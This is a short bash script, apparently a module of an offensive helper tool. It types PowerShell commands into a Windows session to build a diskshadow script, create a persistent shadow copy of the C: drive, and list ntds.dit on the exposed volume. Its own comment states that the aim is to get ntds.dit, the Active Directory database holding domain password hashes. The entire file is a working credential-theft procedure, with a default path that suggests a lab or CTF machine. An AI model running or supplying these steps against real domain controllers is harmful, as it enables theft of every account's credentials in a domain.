#!/bin/bash

: '
ps: create shadow disk (backup) and get ntds.dit
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SCRIPT_LOCATION_FIELD=$(form_item  "script location" "script_location" "C:\Users\svc_veracrypt\tmp.dsh")

# Generate GUI form
generate_form "${SCRIPT_LOCATION_FIELD}"

SCRIPT_LOCATION=${form_data["script_location"]}

execute_command "\$script = \"${SCRIPT_LOCATION}\""
create_new_line
sleep 0.8

execute_command "\"set verbose on\" | Add-Content -Path \$script"
create_new_line
sleep 0.8

execute_command "\"set metadata C:\Windows\Temp\meta.cab\" | Add-Content -Path \$script"
create_new_line
sleep 0.8

execute_command "\"set context clientaccessible\" | Add-Content -Path \$script"
create_new_line
sleep 0.8

execute_command "\"set context persistent\" | Add-Content -Path \$script"
create_new_line
sleep 0.8

execute_command "\"begin backup\" | Add-Content -Path \$script"
create_new_line
sleep 0.8

execute_command "\"add volume C: alias cdrive\" | Add-Content -Path \$script"
create_new_line
sleep 0.8

execute_command "\"create\" | Add-Content -Path \$script"
create_new_line
sleep 0.8

execute_command "\"end backup\" | Add-Content -Path \$script"
create_new_line
sleep 0.8

execute_command "\"exit\" | Add-Content -Path \$script"
create_new_line
sleep 0.8

execute_command "diskshadow /s \$script"
create_new_line
sleep 0.8

execute_command "dir E:\Windows\NTDS\ntds.dit"
create_new_line
